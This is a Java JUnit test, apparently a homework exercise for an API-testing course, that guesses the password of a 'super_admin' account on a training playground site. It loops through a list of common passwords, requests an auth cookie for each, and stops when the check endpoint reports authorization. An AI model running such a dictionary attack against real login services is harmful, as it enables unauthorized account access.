package homework;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class PasswordSelectionTest {
    @Test
    public void testPasswordSelection() {
        String[] possiblePasswords = {"1234", "solo", "111111", "aaa", "princess", "1234567", "123qwe", "000000", "hottie", "qwerty123", "batman", "shadow", "666666", "dragon", "baseball", "starwars", "qwertyuiop", "qazwsx", "ashley", "football", "1q2w3e4r", "admin", "12345", "loveme", "zaq1zaq1", "photoshop[a]", "michael", "zaq1zaq1w", "0000", "!@#$%^&*", "welcome", "7777777", "superman", "freedom", "passw0rd", "trustno1", "654321", "master", "sunshine", "michelle", "aa123456", "michelle111", "123456789", "michelle12", "michelle123"};
        int index = 0;
        String answer = "";

        while (index < possiblePasswords.length && !answer.equals("You are authorized")) {

            Map<String, String> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", possiblePasswords[index]);

            Response responseForGet = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/api/get_auth_cookie")
                    .andReturn();

            String responseCookie = responseForGet.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }

            Response responseForCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/api/check_auth_cookie")
                    .andReturn();

            answer = responseForCheck.asString();
            index++;
        }

        System.out.println(possiblePasswords[index-1]);
        System.out.println(answer);
    }
}


